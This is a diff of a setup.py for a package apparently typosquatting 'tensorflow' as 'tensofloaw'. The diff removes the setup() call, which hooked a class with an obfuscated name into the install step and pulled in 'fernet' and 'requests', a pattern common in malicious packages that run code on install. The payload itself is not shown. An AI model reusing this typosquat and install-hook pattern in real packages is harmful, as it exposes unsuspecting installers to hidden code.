@@ -18,22 +18,5 @@ class ZxuSDmQHFHeVeftFiblAAUBLtqZdJXuuiYelmqeofiSfZosXExcKxMJoFUXlfGMNeWLbBi(ins
             install.run(self)
 
 
-setup(
-    name="tensofloaw",
-    version=VERSION,
-    author="aRsIeciQtDqvOcBhAGFA",
-    author_email="RsGdXpBu@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': ZxuSDmQHFHeVeftFiblAAUBLtqZdJXuuiYelmqeofiSfZosXExcKxMJoFUXlfGMNeWLbBi,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
 
